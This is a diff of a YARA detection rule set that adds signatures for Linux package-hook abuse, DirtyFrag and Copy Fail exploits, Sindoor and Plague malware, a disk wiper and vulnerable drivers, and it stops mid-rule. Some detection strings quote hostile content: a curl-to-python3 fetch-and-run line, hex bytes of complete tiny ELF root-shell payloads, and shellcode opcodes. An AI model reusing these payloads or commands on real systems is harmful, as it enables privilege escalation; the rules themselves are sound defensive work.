@@ -1,8 +1,8 @@
 /*
     VALHALLA YARA RULE SET - DEMO
-    Retrieved: 2026-09-11 18:10
+    Retrieved: 2026-10-02 13:41
     Generated for User: demo
-    Number of Rules: 1298
+    Number of Rules: 1256
     Warning:
         Note that the full rule set contains rules that require modules and threat hunting
         rules with low scores (< 60) that could lead to false positives - use the Python
@@ -60,6 +60,96 @@ rule APT_Virtualizor_Compromise_Payload_Aug26_RID368A : APT DEMO FILE {
       uint16 ( 0 ) == 0x4b50 and filesize < 20MB and all of them
 }
 
+rule SUSP_LNX_ARCH_PKGBUILD_NPM_Dependency_Jun26_RID3577 : DEMO LINUX SCRIPT SUSP {
+   meta:
+      description = "Detects suspicious PKGBUILD with NPM dependency and install script"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 16:14:21"
+      score = 60
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SCRIPT, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $sa1 = { (0A | 20) 64 65 70 65 6E 64 73 3D 28 [0-15] (6E 70 6D | 62 75 6E) } 
+      $sb1 = { 69 6E 73 74 61 6C 6C 20 2D 44 6D 36 34 34 20 (22 | 27) [0-100] 2E 68 6F 6F 6B (22 | 27) 0A } 
+      $sb2 = { 69 6E 73 74 61 6C 6C 3D [1-50] 2E 69 6E 73 74 61 6C 6C } 
+   condition: 
+      filesize < 100KB and $sa1 and 1 of ( $sb* )
+}
+
+rule SUSP_LNX_ARCH_SRCINFO_NPM_Dependency_Jun26_RID3539 : DEMO LINUX SCRIPT SUSP {
+   meta:
+      description = "Detects suspicious .SRCINFO with NPM dependency and install script"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 16:04:01"
+      score = 60
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SCRIPT, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "depends = npm\n" 
+      $s2 = { 69 6E 73 74 61 6C 6C 20 3D 20 [1-50] 2E 69 6E 73 74 61 6C 6C } 
+   condition: 
+      filesize < 5KB and all of them
+}
+
+rule SUSP_LNX_ARCH_Install_Hook_Jun26_RID3244 : DEMO LINUX SUSP {
+   meta:
+      description = "Detects suspicious pre and post hooks in Arch install files"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 13:57:51"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $sa1 = "pre_install() {" 
+      $sa2 = "post_install() {" 
+      $sa3 = "pre_upgrade() {" 
+      $sa4 = "post_upgrade() {" 
+      $sa5 = "pre_remove() {" 
+      $sa6 = "post_remove() {" 
+      $sb1 = "npm install " 
+      $sb2 = "&& 'b''u''n'" 
+      $fp1 = "#!/bin/sh" 
+   condition: 
+      filesize < 5KB and 1 of ( $sa* ) and 1 of ( $sb* ) and not 1 of ( $fp* )
+}
+
+rule SUSP_LNX_ARCH_ALPM_Hook_Jun26_RID3097 : DEMO LINUX SUSP {
+   meta:
+      description = "Detects suspicious execution commands in Arch ALPM hooks"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 12:46:21"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "[Action]" 
+      $s2 = "Exec = " 
+      $s3 = "npm install " 
+      $s4 = "2>/dev/null" 
+   condition: 
+      filesize < 5KB and all of them
+}
+
 rule MAL_APT_Nimbus_Manticore_Stager_May26_RID34B0 : APT DEMO EXE FILE MAL T1053_005 {
    meta:
       description = "Detects .NET based stager using AppDomain Hijacking observed to be used by Nimbus Manticore (UNC1549). The stager drops another payload and establishes persistence via scheduled task."
@@ -86,6 +176,70 @@ rule MAL_APT_Nimbus_Manticore_Stager_May26_RID34B0 : APT DEMO EXE FILE MAL T1053
       $sb4 = "yyyy-MM-ddTHH:mm:ss" wide fullword
    condition: 
       uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or all of ( $sa* ) or all of ( $sb* ) )
+}
+
+rule EXPL_LNX_DirtyFrag_ForensicArtefacts_May26_RID36A9 : DEMO EXPLOIT LINUX {
+   meta:
+      description = "Detects DirtyFrag exploit code POC usage in Linux environments"
+      author = "Florian Roth"
+      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
+      date = "2026-05-08 17:05:21"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, EXPLOIT, LINUX"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $xa1 = "/V4bel/dirtyfrag.git" ascii
+      $xa2 = "static const uint8_t shell_elf[PAYLOAD_LEN] = {" ascii
+      $xa3 = "/usr/bin/su page-cache patched (entry 0x%x = shellcode)" ascii
+   condition: 
+      filesize < 800KB and 1 of ( $xa* )
+}
+
+rule EXPL_LNX_DirtyFragLPE_May26_RID3055 : DEMO EXPLOIT FILE LINUX T1068 {
+   meta:
+      description = "Detects dirtyfrag, a local privilege escalation exploit for Linux."
+      author = "Pezier Pierre-Henri"
+      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
+      date = "2026-05-07 12:35:21"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, EXPLOIT, FILE, LINUX, T1068"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "gained CAP_NET_RAW within netn" ascii
+      $x2 = "DIRTYFRAG_VERBOSE" ascii
+      $s1 = { 15 7C 4A 7F B9 79 37 9E } 
+      $s2 = "/proc/self/setgroups" ascii fullword
+      $s3 = "pcbc(fcrypt)" ascii fullword
+      $s4 = { 17 bb c7 f3 3f 36 ba 71 8e 97 65 60 69 b6 f6 e6 } 
+   condition: 
+      filesize < 100KB and uint32be ( 0 ) == 0x7f454c46 and ( 1 of ( $x* ) or 3 of ( $s* ) )
+}
+
+rule EXPL_HKTL_LNX_DirtyFragShellcode_May26_RID3499 : DEMO EXPLOIT HKTL LINUX T1068 {
+   meta:
+      description = "Detects a shellcode observed in dirtyfrag, a local privilege escalation exploit for Linux."
+      author = "Pezier Pierre-Henri"
+      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
+      date = "2026-05-07 15:37:21"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, EXPLOIT, HKTL, LINUX, T1068"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $op1 = { 31 ff 31 f6 31 c0 b0 6a 0f 05 b0 69 0f 05 b0 74 0f 05 6a 00 48 [6] 50 48 89 e2 48 [6] 31 f6 6a 3b 58 0f 05 } 
+   condition: 
+      $op1
 }
 
 rule HKTL_NET_Edge_Saved_Passwords_Dumper_May26_RID368F : DEMO HKTL T1047 T1057 {
@@ -198,6 +352,49 @@ rule MAL_Minimalistic_Backdoor_May26_RID329F : DEMO EXE FILE MAL {
       $s4 = "input file path cannot be empty." wide
    condition: 
       uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( 1 of ( $x* ) or all of ( $s* ) )
+}
+
+rule EXPL_LNX_Copy_Fail_Artefacts_CVE_2026_31431_Apr26_RID3717 : CVE_2026_31431 DEMO EXPLOIT LINUX SCRIPT T1059_006 T1087_001 {
+   meta:
+      description = "Detects forensic artifacts related to public Copy Fail (CVE-2026-31431) exploit PoCs, including known tiny ELF shell payloads, Python exploit code fragments, AF_ALG/authencesn/splice usage patterns, public PoC URLs, and other indicators observed in online proof-of-concept material."
+      author = "Florian Roth"
+      reference = "https://copy.fail"
+      date = "2026-04-30 17:23:41"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "CVE_2026_31431, DEMO, EXPLOIT, LINUX, SCRIPT, T1059_006, T1087_001"
+      minimum_yara = "4.0.0"
+      
+   strings:
+      $xn1 = "curl https://copy.fail/exp" ascii
+      $xs1 = "| python3 && su" 
+      $xs2 = "g.open(\"/usr/bin/su\",0);i=0;" 
+      $xs3 = "[-] page-cache mutation failed" 
+      $xs4 = "[+] /etc/passwd page cache mutated" 
+      $xs5 = "bind(AF_ALG: authencesn(hmac(sha256),cbc(aes)))" 
+      $xs6 = "/tmp/.cve_test" 
+      $sa1 = "authencesn(hmac(sha256),cbc(aes))" ascii
+      $sb1 = { 08 00 01 00 00 00 00 10 } 
+      $sb2 = "0800010000000010" ascii
+      $xe1 = "authencesn(hmac(sha256),cbc(aes))" base64
+      $xc1 = { 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3e 00 01 00 00 00 78 00 40 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 38 00 01 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 40 00 00 00 00 00 00 9e 00 00 00 00 00 00 00 9e 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 31 c0 31 ff b0 69 0f 05 48 8d 3d 0f 00 00 00 31 f6 6a 3b 58 99 0f 05 31 ff 6a 3c 58 0f 05 2f 62 69 6e 2f 73 68 00 00 00 } 
+      $xc2 = { 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 b7 00 01 00 00 00 78 00 40 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 38 00 01 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 ac 00 00 00 00 00 00 00 ac 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 80 d2 48 12 80 d2 01 00 00 d4 00 01 00 10 01 00 80 d2 02 00 80 d2 a8 1b 80 d2 01 00 00 d4 00 00 80 d2 a8 0b 80 d2 01 00 00 d4 2f 62 69 6e 2f 73 68 00 } 
+      $xg1 = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3" 
+      $xg2 = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858" 
+      $xg3 = "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578" 
+      $xg4 = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf" 
+      $xg5 = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180" 
+      $xg6 = "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509" 
+      $xge1 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 06 3b 06 10 af 82 c1 01 cc 77 60 c0 04 0e 0c 16 0c 30 1d 20 9a 15 4d 16 99 9e 07 e5 c1 68 06 01 08 65 78 c0 f0 ff 86 4c 7e 56 8f 5e 5b 7e 10 f7 5b 96 75 c4 4c 7e 56 c3 ff 59 36 11 fc ac fa 49 99 79 fa c5 19 0c 00 11 1d 10 d3 } 
+      $xge2 = { 78 9c ab 77 f5 71 63 64 64 64 80 01 26 06 66 06 10 2f a4 81 85 c3 84 01 01 4c 18 14 18 60 aa e0 aa 81 6a 40 b8 06 c8 04 61 56 90 98 00 03 83 e1 01 c3 db 1b ae 9e 6d 30 3c 10 90 a1 af 5f 9c 91 a1 9f 94 99 d7 f9 38 20 b8 f3 61 e7 a1 0d dc 40 89 db 59 8c 11 67 1b 00 38 b3 18 58 } 
+      $xge3 = { 78 da ab 77 f5 71 63 62 64 64 80 01 26 86 ed 0c 20 5e 05 83 03 98 ef c0 80 09 1c 18 2c 18 60 3a 40 34 2b 9a 2c 32 bd 06 ca 5b 03 97 87 e9 6c b8 e4 21 d4 70 09 c8 bb 02 14 12 60 04 f2 99 80 78 85 34 54 0c c4 e6 86 b0 f5 93 32 f3 f4 8b 33 18 00 3f f6 15 78 } 
+      $xge4 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 06 3b 06 10 af 82 c1 01 cc 77 60 c0 04 0e 0c 16 0c 30 1d 20 9a 15 4d 16 99 9e 02 e5 c1 68 06 01 08 65 78 c0 f0 ff 86 4c 7e 56 8f ee 1a 15 01 c3 6f 59 d6 11 33 f9 59 0d ff 67 d9 44 f0 b3 02 00 82 b0 0e af } 
+      $xge5 = { 78 9c ab 77 f5 71 63 64 64 64 80 01 26 06 66 06 10 2f a4 81 85 c3 84 01 01 4c 18 14 18 60 aa e0 aa 81 6a 40 38 1f c8 04 61 56 90 98 00 03 83 e1 01 c3 db 1b ae 9e 6d e8 8e 51 e1 30 3c 99 c5 1d 31 f3 6c 83 e1 ed 2c c6 88 b3 0d 00 1b f4 11 80 } 
+      $xge6 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 86 ed 0c 20 5e 05 83 03 98 ef c0 80 09 1c 18 2c 18 60 3a 40 34 2b 9a 2c 32 bd 04 ca 5b 02 97 87 e9 6c b8 e4 21 d4 70 09 c8 bb f2 80 db e1 27 23 90 cf 04 c4 2b a4 21 62 20 f9 15 dc 10 36 00 d7 2b 15 09 } 
+   condition: 
+      1 of ( $x* ) or ( $sa1 and 1 of ( $sb* ) )
 }
 
 rule HKTL_BlueHammer_Apr26_RID2E6F : DEMO HKTL T1003 T1068 {
@@ -829,6 +1026,32 @@ rule PUA_VULN_Driver_Asustekcomputerinc_Atsziosys_Atsziodriver_1A4F_RID3F36 : DE
       $ = { 00 50 00 72 00 6f 00 64 00 75 00 63 00 74 00 4e 00 61 00 6d 00 65 [1-8] 00 41 00 54 00 53 00 5a 00 49 00 4f 00 20 00 44 00 72 00 69 00 76 00 65 00 72 } 
       $ = { 00 4f 00 72 00 69 00 67 00 69 00 6e 00 61 00 6c 00 46 00 69 00 6c 00 65 00 6e 00 61 00 6d 00 65 [1-8] 00 41 00 54 00 53 00 5a 00 49 00 4f 00 2e 00 73 00 79 00 73 } 
       $ = { 00 4c 00 65 00 67 00 61 00 6c 00 43 00 6f 00 70 00 79 00 72 00 69 00 67 00 68 00 74 [1-8] 00 43 00 6f 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 31 00 32 } 
+   condition: 
+      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
+}
+
+rule PUA_VULN_Driver_Asustekcomputerinc_Bsdefsys_Supportsstsfssteeatftatcamfntamfnbvctvcbmftwc_5F5E_RID4CA1 : DEMO EXE FILE {
+   meta:
+      description = "Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Bs_Def.sys"
+      author = "Florian Roth"
+      reference = "https://github.com/magicsword-io/LOLDrivers"
+      date = "2025-09-18 08:42:41"
+      score = 40
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, EXE, FILE"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $ = { 00 46 00 69 00 6c 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69 00 6f 00 6e [1-8] 00 44 00 65 00 66 00 61 00 75 00 6c 00 74 00 20 00 42 00 49 00 4f 00 53 00 20 00 46 00 6c 00 61 00 73 00 68 00 20 00 44 00 72 00 69 00 76 00 65 00 72 } 
+      $ = { 00 43 00 6f 00 6d 00 70 00 61 00 6e 00 79 00 4e 00 61 00 6d 00 65 [1-8] 00 41 00 73 00 75 00 73 00 54 00 65 00 6b 00 20 00 43 00 6f 00 6d 00 70 00 75 00 74 00 65 00 72 00 20 00 49 00 6e 00 63 00 2e } 
+      $ = { 00 46 00 69 00 6c 00 65 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e [1-8] 00 31 00 2e 00 32 00 34 00 20 00 62 00 75 00 69 00 6c 00 74 00 20 00 62 00 79 00 3a 00 20 00 57 00 69 00 6e 00 44 00 44 00 4b } 
+      $ = { 00 50 00 72 00 6f 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e [1-8] 00 31 00 2e 00 32 00 34 } 
+      $ = { 00 49 00 6e 00 74 00 65 00 72 00 6e 00 61 00 6c 00 4e 00 61 00 6d 00 65 [1-8] 00 42 00 73 00 5f 00 44 00 65 00 66 00 36 00 34 00 2e 00 73 00 79 00 73 } 
+      $ = { 00 50 00 72 00 6f 00 64 00 75 00 63 00 74 00 4e 00 61 00 6d 00 65 [1-8] 00 53 00 75 00 70 00 70 00 6f 00 72 00 74 00 20 00 53 00 53 00 54 00 33 00 39 00 53 00 46 00 30 00 32 00 30 00 2c 00 53 00 53 00 54 00 32 00 39 00 45 00 45 00 30 00 32 00 30 00 2c 00 41 00 54 00 34 00 39 00 46 00 30 00 30 00 32 00 54 00 2c 00 41 00 54 00 32 00 39 00 43 00 30 00 32 00 30 00 2c 00 41 00 4d 00 32 00 39 00 46 00 30 00 30 00 32 00 4e 00 54 00 2c 00 41 00 4d 00 32 00 39 00 46 00 30 00 30 00 32 00 4e 00 42 00 2c 00 56 00 32 00 39 00 43 00 35 00 31 00 30 00 30 00 32 00 54 00 2c 00 56 00 32 00 39 00 43 00 35 00 31 00 30 00 30 00 32 00 42 00 2c 00 4d 00 32 00 39 00 46 00 30 00 30 00 32 00 54 00 2c 00 57 00 32 00 39 00 43 00 30 00 32 00 30 00 2e } 
+      $ = { 00 4f 00 72 00 69 00 67 00 69 00 6e 00 61 00 6c 00 46 00 69 00 6c 00 65 00 6e 00 61 00 6d 00 65 [1-8] 00 42 00 73 00 5f 00 44 00 65 00 66 00 36 00 34 00 2e 00 73 00 79 00 73 } 
+      $ = { 00 4c 00 65 00 67 00 61 00 6c 00 43 00 6f 00 70 00 79 00 72 00 69 00 67 00 68 00 74 [1-8] 00 43 00 6f 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43 00 29 00 20 00 41 00 73 00 75 00 73 00 54 00 65 00 6b 00 20 00 43 00 6f 00 6d 00 70 00 75 00 74 00 65 00 72 00 2e 00 20 00 31 00 39 00 39 00 32 00 2d 00 32 00 30 00 30 00 34 } 
    condition: 
       uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
 }
@@ -3229,6 +3452,92 @@ rule MAL_JS_NPM_SupplyChain_Attack_Sep25_RID33A5 : DEMO MAL OBFUS T1059_007 {
       filesize < 200KB and 1 of ( $x* ) and not 1 of ( $fp* )
 }
 
+rule SUSP_LNX_Sindoor_ELF_Obfuscation_Aug25_RID34DF : DEMO FILE LINUX OBFUS SUSP {
+   meta:
+      description = "Detects ELF obfuscation technique used by Sindoor dropper related to APT 36"
+      author = "Pezier Pierre-Henri"
+      reference = "Internal Research"
+      date = "2025-08-29 15:49:01"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, FILE, LINUX, OBFUS, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "UPX!" 
+   condition: 
+      filesize < 10MB and uint16 ( 0 ) == 0 and uint16 ( 4 ) > 0 and $s1 in ( 0xc0 .. 0x100 )
+}
+
+rule SUSP_LNX_Sindoor_DesktopFile_Aug25_RID3386 : DEMO LINUX OBFUS SUSP {
+   meta:
+      description = "Detects ELF obfuscation technique used by Sindoor dropper related to APT 36"
+      author = "Pezier Pierre-Henri"
+      reference = "Internal Research"
+      date = "2025-08-29 14:51:31"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, OBFUS, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $hdr = "[Desktop Entry]" 
+      $s1 = "printf '\\\\x7FELF' | dd of" 
+      $s2 = "Future_Note_Warfare_OpSindoor.pdf" 
+   condition: 
+      filesize < 100KB and $hdr and any of ( $s* )
+}
+
+rule MAL_Sindoor_Decryptor_Aug25_RID3126 : DEMO EXE FILE MAL {
+   meta:
+      description = "Detects AES decryptor used by Sindoor dropper related to APT 36"
+      author = "Pezier Pierre-Henri"
+      reference = "Internal Research"
+      date = "2025-08-29 13:10:11"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, EXE, FILE, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "Go build" 
+      $s2 = "main.rc4EncryptDecrypt" 
+      $s3 = "main.processFile" 
+      $s4 = "main.deriveKeyAES" 
+      $s5 = "use RC4 instead of AES" 
+   condition: 
+      filesize < 100MB and ( uint16 ( 0 ) == 0x5a4d or uint32be ( 0 ) == 0x7f454c46 or ( uint32be ( 0 ) == 0xcafebabe and uint32be ( 4 ) < 0x20 ) or uint32 ( 0 ) == 0xfeedface or uint32 ( 0 ) == 0xfeedfacf ) and all of them
+}
+
+rule MAL_Sindoor_Downloader_Aug25_RID3179 : DEMO EXE FILE MAL T1105 {
+   meta:
+      description = "Detects Sindoor downloader related to APT 36"
+      author = "Pezier Pierre-Henri"
+      reference = "Internal Research"
+      date = "2025-08-29 13:24:01"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, EXE, FILE, MAL, T1105"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "Go build" 
+      $s2 = "main.downloadFile.deferwrap" 
+      $s3 = "main.decrypt" 
+      $s4 = "main.HiddenHome" 
+      $s5 = "main.RealCheck" 
+   condition: 
+      filesize < 100MB and ( uint16 ( 0 ) == 0x5a4d or uint32be ( 0 ) == 0x7f454c46 or ( uint32be ( 0 ) == 0xcafebabe and uint32be ( 4 ) < 0x20 ) or uint32 ( 0 ) == 0xfeedface or uint32 ( 0 ) == 0xfeedfacf ) and all of them
+}
+
 rule SUSP_EXPL_CommVault_CVE_2025_57791_Aug25_1_RID342F : CVE_2025_57791 DEMO EXE EXPLOIT FILE SUSP {
    meta:
       description = "Detects potential exploit for WT-2025-0050, authentication bypass through QCommand argument injection"
@@ -3414,6 +3723,30 @@ rule SUSP_JAVA_Class_Allatori_Obfuscator_Aug25_RID3623 : DEMO FILE OBFUS SUSP {
       uint16 ( 0 ) == 0x4b50 and filesize < 500KB and $x1
 }
 
+rule MAL_LNX_PLAGUE_BACKDOOR_Jul25_RID2FEE : DEMO FILE LINUX MAL {
+   meta:
+      description = "Detects Plague backdoor ELF binaries, related to PAM authentication alteration."
+      author = "Pezier Pierre-Henri"
+      reference = "Internal Research"
+      date = "2025-07-25 12:18:11"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      modified = "2025-09-17"
+      tags = "DEMO, FILE, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "decrypt_phrase" 
+      $s2 = "init_phrases" 
+      $x1 = "captured_password" 
+      $x2 = "updateklog" 
+      $x3 = "init_cred_structs" 
+      $xop1 = { 48 8b [4] 00 8b 00 3d ca b2 e9 f1 74 } 
+   condition: 
+      uint32be ( 0 ) == 0x7f454c46 and filesize < 1MB and 2 of them
+}
+
 rule WEBSHELL_ASPX_Sharepoint_Drop_CVE_2025_53770_Jul25_RID372D : CVE_2025_53770 DEMO SCRIPT T1505_003 WEBSHELL {
    meta:
       description = "Detects ASPX web shell dropped during the exploitation of SharePoint RCE vulnerability CVE-2025-53770"
@@ -3509,6 +3842,27 @@ rule APT_EXPL_Sharepoint_CVE_2025_53770_ForensicArtefact_Jul25_2_RID3B18 : APT C
       $xe6 = "NAEkAQwBSAE8AUwB+ADEAXABXAEUAQgBTAEUAUgB+ADEAXAAxADUAXABUAEUATQBQAEwAQQBUAEUAXABMAEEAWQBPAFUAVABTAFwA" 
    condition: 
       1 of them
+}
+
+rule SUSP_LNX_SH_Disk_Wiper_Script_Jun25_RID33BE : DEMO FILE LINUX SCRIPT SUSP {
+   meta:
+      description = "Detects unknown disk wiper script for Linux systems"
+      author = "Florian Roth"
+      reference = "Internal Research"
+      date = "2025-06-19 15:00:51"
+      score = 65
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "f662f69fc7f4240cd8c00661db9484e76b5d02f903590140b4086fefcf9d9331"
+      tags = "DEMO, FILE, LINUX, SCRIPT, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "THIS SCRIPT IS LIVE AND ARMED!" ascii fullword
+      $s2 = "FAIR WARNING!" ascii fullword
+      $s3 = "lists devices" ascii fullword
+   condition: 
+      uint16 ( 0 ) == 0x2123 and filesize < 2KB and all of them
 }
 
 rule MAL_NET_Katz_Stealer_Loader_May25_RID32FC : DEMO MAL katzstealer {
@@ -3795,6 +4149,45 @@ rule SUSP_LNK_Suspicious_Folders_Jan25_RID3343 : DEMO FILE SUSP T1210 T1547_009 
       $x2 = "Perflogs\\" wide
    condition: 
       uint16 ( 0 ) == 0x004c and 1 of them
+}
+
+rule SUSP_LNX_ByteEncoder_Jan25_RID303F : DEMO FILE LINUX SUSP {
+   meta:
+      description = "Detects Linux binaries that encode bytes by splitting them into upper and lower nibbles and mapping them to custom lookup tables, seen being used by SEASPY and Bluez backdoors"
+      author = "MalGamy (Nextron Systems)"
+      reference = "https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/"
+      date = "2025-01-23 12:31:41"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, FILE, LINUX, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $op1 = { 8B 45 FC 48 63 D0 48 8B 45 A8 48 01 C2 8B 45 BC C1 F8 04 83 E0 0F 48 98 0F B6 44 05 E0 88 02 } 
+      $op2 = { 8B 45 FC 48 98 48 8D 50 01 48 8B 45 A8 48 01 C2 8B 45 BC 83 E0 0F 48 98 0F B6 44 05 C0 88 02 } 
+   condition: 
+      uint32be ( 0 ) == 0x7f454c46 and filesize < 4MB and all of them
+}
+
+rule SUSP_LNX_StackString_Technique_Jan25_RID345D : DEMO FILE LINUX SUSP {
+   meta:
+      description = "Detects Linux binaries using stack-based string manipulation techniques, which are often used to generate PTY (pseudo-terminal) device names for stealth or persistence, seen being used by SEASPY and Bluez backdoors"
+      author = "MalGamy (Nextron Systems)"
+      reference = "https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/"
+      date = "2025-01-23 15:27:21"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, FILE, LINUX, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $op1 = { C7 45 E0 70 71 72 73 C7 45 E4 74 75 76 77 C7 45 E8 78 79 7A 61 C7 45 EC 62 63 64 65 C6 45 F0 00 C7 45 C0 30 31 32 33 C7 45 C4 34 35 36 37 C7 45 C8 38 39 61 62 C7 45 CC 63 64 65 66 } 
+   condition: 
+      uint32be ( 0 ) == 0x7f454c46 and filesize < 4MB and $op1
 }
 
 rule EXPL_Cleo_Exploitation_Log_Indicators_Dec24_RID374C : DEMO EXPLOIT LOG SCRIPT {
@@ -4103,6 +4496,30 @@ rule EXPL_Cleo_Exploitation_JAVA_Payloads_Dec24_3_RID370B : DEMO EXPLOIT FILE {
       uint16 ( 0 ) == 0xfeca and filesize < 20KB and 3 of ( $s* ) and $a1
 }
 
+rule MAL_ELF_Xlogin_Nov24_1_RID2E79 : DEMO FILE LINUX MAL {
+   meta:
+      description = "Detects xlogin backdoor samples"
+      author = "Florian Roth"
+      reference = "https://blog.sekoia.io/solving-the-7777-botnet-enigma-a-cybersecurity-quest/"
+      date = "2024-11-11 11:16:01"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "2b09a6811a9d0447f8c6480430eb0f7e3ff64fa933d0b2e8cd6117f38382cc6a"
+      hash2 = "d1cbf80786b1ca1ba2e5c31ec09159be276ad3d10fc0a8a0dbff229d8263ca0a"
+      hash3 = "ff17e9bcc1ed16985713405b95745e47674ec98e3c6c889df797600718a35b2c"
+      tags = "DEMO, FILE, LINUX, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
